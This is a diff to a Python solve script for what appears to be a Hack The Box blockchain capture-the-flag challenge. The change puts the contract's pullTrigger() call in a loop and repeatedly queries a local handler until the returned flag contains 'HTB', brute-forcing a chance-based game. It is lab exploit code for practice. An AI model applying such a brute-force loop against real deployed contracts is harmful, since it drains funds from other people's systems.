@@ -36,12 +36,16 @@ if __name__ == "__main__":
     setup = connection_info['Setup Contract']
     target = connection_info['Target Contract']
 
-    csend(target, "pullTrigger()")
+    while True:
+        # try luck
+        csend(target, "pullTrigger()") 
 
-    # get flag
-    with remote("0.0.0.0", HANDLER_PORT) as p:
-        p.recvuntil(b"action? ")
-        p.sendline(b"3")
-        flag = p.recvall().decode()
+        # get flag
+        with remote("0.0.0.0", HANDLER_PORT) as p:
+            p.recvuntil(b"action? ")
+            p.sendline(b"3")
+            flag = p.recvall().decode()
 
-    print(f"\n\n[*] {flag}")
+        if "HTB" in flag:
+            print(f"\n\n[*] {flag}")
+            break
